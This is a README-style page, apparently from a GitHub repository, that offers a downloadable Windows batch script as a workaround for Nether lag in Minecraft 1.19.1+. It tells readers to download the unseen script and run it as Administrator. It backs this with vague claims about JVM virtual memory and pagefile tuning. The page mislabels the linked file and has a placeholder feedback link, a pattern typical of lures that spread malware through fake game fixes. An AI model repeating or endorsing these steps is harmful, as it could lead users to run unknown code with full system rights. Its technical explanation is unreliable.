## 🔧 Temporary Fix for Nether Lag Issue on Minecraft 1.19.1+

Since Minecraft 1.19.1, several users have reported **severe performance drops when entering the Nether**,  
especially on systems running Windows 10/11 with limited system memory or HDD storage.

This issue seems to stem from how the Java Virtual Machine (JVM) interacts with virtual memory  
during the initial load of the Nether dimension. In particular, I/O delays caused by world initialization  
can result in sudden frame drops or freezing when transitioning to the Nether.

> 📝 Note: As of now, Mojang has not officially addressed this issue in patch notes or snapshots.

This `.bat` script offers a **lightweight workaround** by optimizing certain system parameters  
prior to Minecraft startup. It flushes unused system caches, ensures proper pagefile allocation,  
and prepares the environment to better handle Nether world loading.

### ✅ How to Use

1. Download the optimization script:  
   [📥 Download optimize_nether.bat](https://github.com/subsubgraphite/fixmcbug_1.19.1_patch/blob/main/mcfix.bat)

2. Right-click the file → "Run as Administrator"

3. Launch Minecraft and try entering the Nether again

---

### ⚠️ Disclaimer

This script is provided as-is and intended as a workaround for a known issue in specific environments.  
It does **not modify Minecraft files or install any persistent background processes.**  
Use at your own risk.

---

### 💬 Feedback & Issues

Let us know if the script helped or didn’t make a difference by [opening an issue](https://github.com/your-repo/issues).  
Any feedback helps improve support for different system configurations.
